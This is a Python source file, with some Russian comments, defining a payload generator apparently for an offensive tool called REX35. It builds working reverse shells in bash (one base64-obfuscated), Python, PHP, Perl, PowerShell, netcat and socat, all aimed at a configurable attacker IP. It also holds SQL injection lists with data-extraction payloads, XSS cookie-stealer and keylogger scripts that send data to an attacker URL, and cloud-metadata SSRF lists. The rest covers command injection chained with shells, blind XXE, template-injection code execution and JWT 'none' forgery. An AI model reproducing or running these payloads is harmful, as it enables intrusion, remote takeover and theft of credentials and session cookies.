"""
Payload Generator для REX35
Автогенерация:
- Reverse shells (bash, python, php, powershell)
- SQL injection payloads
- XSS vectors
- SSRF bypasses
- Command injection
- Path traversal
"""
import base64, urllib.parse, random, string

class PayloadGenerator:
    def __init__(self, attacker_ip: str = "10.10.10.10", attacker_port: int = 4444):
        self.ip = attacker_ip
        self.port = attacker_port
    
    # ━━━ REVERSE SHELLS ━━━
    def reverse_shell_bash(self) -> str:
        """Bash reverse shell"""
        payload = f"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
        return payload
    
    def reverse_shell_bash_base64(self) -> str:
        """Base64 encoded bash shell"""
        raw = self.reverse_shell_bash()
        encoded = base64.b64encode(raw.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"
    
    def reverse_shell_python(self) -> str:
        """Python reverse shell"""
        return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.ip}",{self.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'"""
    
    def reverse_shell_php(self) -> str:
        """PHP reverse shell"""
        return f"""php -r '$sock=fsockopen("{self.ip}",{self.port});exec("/bin/bash -i <&3 >&3 2>&3");'"""
    
    def reverse_shell_perl(self) -> str:
        """Perl reverse shell"""
        return f"""perl -e 'use Socket;$i="{self.ip}";$p={self.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};'"""
    
    def reverse_shell_powershell(self) -> str:
        """PowerShell reverse shell"""
        return f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{self.ip}',{self.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """
    
    def reverse_shell_netcat(self) -> str:
        """Netcat reverse shell"""
        return f"nc -e /bin/bash {self.ip} {self.port}"
    
    def reverse_shell_socat(self) -> str:
        """Socat reverse shell (more stable)"""
        return f"socat TCP:{self.ip}:{self.port} EXEC:/bin/bash"
    
    def get_all_reverse_shells(self) -> dict:
        """Получить все reverse shell варианты"""
        return {
            "bash": self.reverse_shell_bash(),
            "bash_base64": self.reverse_shell_bash_base64(),
            "python": self.reverse_shell_python(),
            "php": self.reverse_shell_php(),
            "perl": self.reverse_shell_perl(),
            "powershell": self.reverse_shell_powershell(),
            "netcat": self.reverse_shell_netcat(),
            "socat": self.reverse_shell_socat()
        }
    
    # ━━━ SQL INJECTION PAYLOADS ━━━
    def sqli_payloads_basic(self) -> list:
        """Basic SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--"
        ]
    
    def sqli_payloads_timebased(self, seconds: int = 5) -> list:
        """Time-based SQL injection (for blind SQLi)"""
        return [
            f"' OR IF(1=1, SLEEP({seconds}), 0)--",
            f"' OR (SELECT * FROM (SELECT(SLEEP({seconds})))a)--",
            f"'; WAITFOR DELAY '00:00:{seconds:02d}'--",
            f"' AND (SELECT * FROM (SELECT(SLEEP({seconds})))a)--",
            f"1' AND SLEEP({seconds})--",
            f"1' AND (SELECT {seconds} FROM PG_SLEEP({seconds}))--"
        ]
    
    def sqli_payloads_union(self, columns: int = 3) -> list:
        """UNION-based SQL injection"""
        nulls = ",NULL" * (columns - 1)
        payloads = [
            f"' UNION SELECT NULL{nulls}--",
            f"' UNION ALL SELECT NULL{nulls}--",
            f"' UNION SELECT {','.join([str(i) for i in range(1, columns+1)])}--"
        ]
        
        # Data exfiltration payloads
        if columns >= 2:
            payloads.extend([
                f"' UNION SELECT user(),database(){nulls[:-5]}--",
                f"' UNION SELECT table_name,NULL FROM information_schema.tables{nulls[:-10]}--",
                f"' UNION SELECT column_name,NULL FROM information_schema.columns{nulls[:-10]}--"
            ])
        
        return payloads
    
    def sqli_payloads_error_based(self) -> list:
        """Error-based SQL injection"""
        return [
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
            "' AND exp(~(SELECT * FROM (SELECT version())x))--"
        ]
    
    # ━━━ XSS PAYLOADS ━━━
    def xss_payloads_basic(self) -> list:
        """Basic XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
        ]
    
    def xss_payloads_encoded(self) -> list:
        """Encoded XSS payloads (bypass filters)"""
        return [
            "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e"
        ]
    
    def xss_payload_cookie_stealer(self, attacker_url: str) -> str:
        """XSS для кражи cookies"""
        return f"<script>document.location='http://{attacker_url}/steal?c='+document.cookie</script>"
    
    def xss_payload_keylogger(self, attacker_url: str) -> str:
        """XSS keylogger"""
        return f"""<script>document.onkeypress=function(e){{fetch('http://{attacker_url}/log?k='+e.key)}}</script>"""
    
    # ━━━ SSRF PAYLOADS ━━━
    def ssrf_payloads(self) -> list:
        """SSRF payloads для обхода фильтров"""
        return [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://127.1",
            "http://127.0.1",
            "http://2130706433",  # decimal 127.0.0.1
            "http://0x7f.0x0.0x0.0x1",  # hex 127.0.0.1
            "http://localhost:80",
            "http://localhost:443",
            "http://localhost:22",
            "http://169.254.169.254",  # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal",  # GCP metadata
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "dict://localhost:11211",  # memcached
            "gopher://localhost:6379",  # redis
        ]
    
    # ━━━ COMMAND INJECTION ━━━
    def command_injection_payloads(self) -> list:
        """Command injection payloads"""
        return [
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls -la",
            "| ls -la",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            # Encoded
            ";%20whoami",
            "%0awhoami",
            "%0d%0awhoami",
        ]
    
    def command_injection_with_reverse_shell(self) -> list:
        """Command injection с reverse shell"""
        bash_shell = self.reverse_shell_bash()
        return [
            f"; {bash_shell}",
            f"| {bash_shell}",
            f"& {bash_shell}",
            f"&& {bash_shell}",
            f"`{bash_shell}`",
            f"$({bash_shell})"
        ]
    
    # ━━━ PATH TRAVERSAL ━━━
    def path_traversal_payloads(self, target_file: str = "/etc/passwd") -> list:
        """Path traversal payloads"""
        payloads = []
        
        win_target = target_file.replace('/', '\\')
        for depth in range(1, 10):
            prefix = "../" * depth
            pct2f   = prefix.replace('/', '%2f')
            pct252f = prefix.replace('/', '%252f')
            payloads.extend([
                f"{prefix}{target_file}",
                f"{pct2f}{target_file}",
                f"{pct252f}{target_file}",  # double encoding
                f"....//....//....//....//....//....//....//....//....//....{target_file}",
                f"..\\..\\..\\..\\..\\..\\..\\..\\{win_target}",
            ])
        
        # Windows specific
        if "windows" in target_file.lower() or "win.ini" in target_file.lower():
            payloads.extend([
                "C:\\windows\\win.ini",
                "C:/windows/win.ini",
                "/windows/win.ini",
                "..\\..\\..\\..\\..\\windows\\win.ini"
            ])
        
        return payloads
    
    # ━━━ XXE PAYLOADS ━━━
    def xxe_payload_basic(self) -> str:
        """Basic XXE payload"""
        return """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""
    
    def xxe_payload_blind(self, attacker_url: str) -> str:
        """Blind XXE with out-of-band"""
        return f"""<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{attacker_url}/xxe.dtd">
%xxe;
]>
<root></root>"""
    
    # ━━━ LDAP INJECTION ━━━
    def ldap_injection_payloads(self) -> list:
        """LDAP injection payloads"""
        return [
            "*",
            "*)(&",
            "*)(uid=*))(&(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*",
            "*))(|(objectClass=*"
        ]
    
    # ━━━ TEMPLATE INJECTION ━━━
    def ssti_payloads(self) -> dict:
        """Server-Side Template Injection"""
        return {
            "jinja2": [
                "{{7*7}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ],
            "twig": [
                "{{7*7}}",
                "{{_self.env.getRuntime('Twig\\Runtime\\EscaperRuntime')}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
            ],
            "freemarker": [
                "${7*7}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            ],
            "velocity": [
                "#set($x=7*7)$x",
                "#set($rt = $class.forName('java.lang.Runtime'))",
            ]
        }
    
    # ━━━ JWT MANIPULATION ━━━
    def jwt_none_algorithm(self, payload: dict) -> str:
        """JWT with 'none' algorithm bypass"""
        import json
        header = {"alg": "none", "typ": "JWT"}
        encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        return f"{encoded_header}.{encoded_payload}."
    
    # ━━━ UTILITY ━━━
    def url_encode(self, payload: str) -> str:
        """URL encode payload"""
        return urllib.parse.quote(payload)
    
    def double_url_encode(self, payload: str) -> str:
        """Double URL encode"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def generate_random_string(self, length: int = 10) -> str:
        """Random string for testing"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
